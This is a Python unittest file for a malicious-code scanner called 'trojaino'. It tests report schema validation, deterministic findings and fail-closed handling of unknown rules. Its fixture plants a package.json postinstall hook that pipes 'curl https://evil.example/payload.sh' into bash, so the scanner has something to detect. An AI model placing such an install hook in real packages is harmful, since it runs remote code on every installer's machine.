from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import jsonschema

from trojaino.models import Finding, REPORT_SCHEMA_VERSION
from trojaino.report import render_html, render_json, render_text
from trojaino.scanner import scan_path
from trojaino.rules.registry import RULE_DEFINITIONS, RULE_IDS, RULE_PACK_ID, RULE_PACK_VERSION


class MachineContractTests(unittest.TestCase):
    def make_project(self, root: Path) -> None:
        (root / "src").mkdir(parents=True)
        (root / "package.json").write_text(
            '{"scripts":{"postinstall":"curl https://evil.example/payload.sh | bash"}}',
            encoding="utf-8",
        )
        (root / "src" / "app.py").write_text("import subprocess\nsubprocess.run('x', shell=True)\n", encoding="utf-8")

    def schema(self) -> dict:
        schema_path = Path(__file__).parents[1] / "schemas" / "trojaino-report-v1.schema.json"
        return json.loads(schema_path.read_text(encoding="utf-8"))

    def test_registry_is_unique_and_immutable(self):
        self.assertEqual(len(RULE_DEFINITIONS), len(set(RULE_DEFINITIONS)))
        self.assertEqual(RULE_IDS, frozenset(RULE_DEFINITIONS))
        with self.assertRaises(TypeError):
            RULE_DEFINITIONS["TEST_RULE"] = object()  # type: ignore[index]

    def test_machine_report_validates_against_published_schema(self):
        root = Path(tempfile.mkdtemp(prefix="trojaino-contract-"))
        self.make_project(root)

        payload = json.loads(render_json(scan_path(root)))
        jsonschema.Draft202012Validator(self.schema()).validate(payload)

        self.assertEqual(payload["schema_version"], REPORT_SCHEMA_VERSION)
        self.assertEqual(payload["rule_pack"], {"id": RULE_PACK_ID, "version": RULE_PACK_VERSION})
        self.assertEqual(payload["scan_profile"], {"id": "default"})
        self.assertTrue(payload["findings"])
        self.assertTrue(all(finding["id"] in RULE_DEFINITIONS for finding in payload["findings"]))
        self.assertTrue(all(len(finding["fingerprint"]) == 24 for finding in payload["findings"]))

    def test_schema_allows_compatible_additive_fields(self):
        root = Path(tempfile.mkdtemp(prefix="trojaino-contract-additive-"))
        self.make_project(root)
        payload = json.loads(render_json(scan_path(root)))
        payload["future_metadata"] = {"producer": "future-trojaino"}

        jsonschema.Draft202012Validator(self.schema()).validate(payload)

    def test_equivalent_inputs_have_deterministic_normalized_findings(self):
        first = Path(tempfile.mkdtemp(prefix="trojaino-contract-first-"))
        second = Path(tempfile.mkdtemp(prefix="trojaino-contract-second-"))
        self.make_project(first)
        self.make_project(second)

        left = json.loads(render_json(scan_path(first)))
        right = json.loads(render_json(scan_path(second)))

        self.assertEqual(left["verdict"], right["verdict"])
        self.assertEqual(left["findings"], right["findings"])
        self.assertEqual(
            [finding["fingerprint"] for finding in left["findings"]],
            [finding["fingerprint"] for finding in right["findings"]],
        )

    def test_unregistered_rule_fails_closed_and_is_not_emitted(self):
        root = Path(tempfile.mkdtemp(prefix="trojaino-contract-unknown-"))
        (root / "app.txt").write_text("safe", encoding="utf-8")

        def unregistered_rule(*_args):
            return [Finding("UNKNOWN_RULE", "high", "high", "Unknown", "app.txt", 1, "x", "why", "fix")]

        with patch("trojaino.scanner.RULES", [unregistered_rule]):
            result = scan_path(root)

        self.assertEqual(result.verdict, "DO NOT RUN")
        self.assertEqual(result.findings, [])
        self.assertIn("rule_contract_violation", {issue.code for issue in result.issues or []})

    def test_human_reports_show_the_same_rule_id(self):
        root = Path(tempfile.mkdtemp(prefix="trojaino-contract-human-"))
        self.make_project(root)
        result = scan_path(root)

        self.assertIn("Rule: PKG_REMOTE_LIFECYCLE_EXEC", render_text(result))
        self.assertIn("PKG_REMOTE_LIFECYCLE_EXEC", render_html(result))


if __name__ == "__main__":
    unittest.main()
